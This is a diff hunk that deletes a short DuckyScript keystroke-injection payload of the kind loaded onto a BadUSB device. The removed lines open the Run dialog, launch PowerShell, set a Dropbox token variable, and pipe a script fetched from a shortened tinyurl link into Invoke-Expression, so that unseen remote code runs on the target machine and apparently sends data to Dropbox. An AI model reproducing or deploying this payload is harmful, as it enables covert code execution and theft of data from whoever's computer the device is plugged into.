@@ -1,9 +1,0 @@
-GUI r
-SLEEP 1
-STRING powershell
-ENTER
-SLEEP 1
-STRING $db = 'INSERT YOUR DROPBOX TOKEN HERE'; irm tinyurl.com/3tm7msr7 | iex
-ENTER
-STRING exit
-ENTER
